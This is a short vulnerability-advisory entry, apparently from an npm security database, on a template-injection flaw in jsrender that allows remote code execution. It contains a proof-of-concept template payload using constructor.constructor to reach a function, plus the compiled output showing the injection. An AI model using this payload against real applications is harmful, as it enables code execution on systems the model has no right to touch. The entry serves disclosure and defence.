- id: npmjs:npm:jsrender:97
  title: Template Injection
  description: "Affected versions of `jsrender` are susceptible to a remote code execution
    vulnerability when used with server delivered client-side tempates which dynamically
    embed user input.\n\n## Proof of Concept\n\n\n```\n<POC-REQUEST>\n{{for ~x!=1?(constructor.constructor(\"return
    arguments.callee.caller\")()):~y(10)}}\n{{:#data}}\n{{/for}}\n</POC-REQUEST>\n```\n\n```\n<POC-RESPONSE>\nfunction
    anonymous(data,view,j,u) { // template var v,t=j._tag,ret=\"\" +t(\"for\",view,this,[
    {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\\\"return arguments.callee.caller\\\")()):~y(10)']},
    args:[view.hlp(\"x\")!=1?(data.constructor.constructor(\"return arguments.callee.caller\")()):view.hlp(\"y\")(10)],
    props:{}}]); return ret; } \n<POC-RESPONSE>\n```"
